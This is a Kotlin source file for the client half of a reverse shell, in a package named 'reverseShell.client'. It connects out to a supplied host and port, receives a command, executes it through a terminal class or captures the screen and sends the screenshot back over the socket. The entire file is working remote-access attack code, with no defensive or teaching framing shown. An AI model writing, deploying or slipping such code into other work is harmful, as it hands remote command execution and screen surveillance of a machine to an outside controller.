package reverseShell.client

import Classes.screenshot.ScreenShot
import Classes.terminal.ExecTerminal
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintStream
import java.net.Socket

class Client {
    fun connect(host: String, port: Int) {
        println("Connecting to server...")
        val socket = Socket(host, port)
        println("Connected to server")

        val input = BufferedReader(InputStreamReader(socket.getInputStream()))
        val output = PrintStream(socket.getOutputStream())

        println("Receiving command...")
        val command = input.readLine()
        println("Received command: $command")

        println("Executing command...")
        if (command.startsWith("//")) ExecTerminal(command.removePrefix("//"), output)
        else if (command.startsWith("/"))
            when (command.removePrefix("/").lowercase()){
                "screenshot" -> {
                    val image = ScreenShot().captureScreen()
                    ScreenShot().sendScreenshot(image, output, "/screenshots/screenshot.png")
                }

            }

        print("Exiting...")
        socket.close()
    }
}
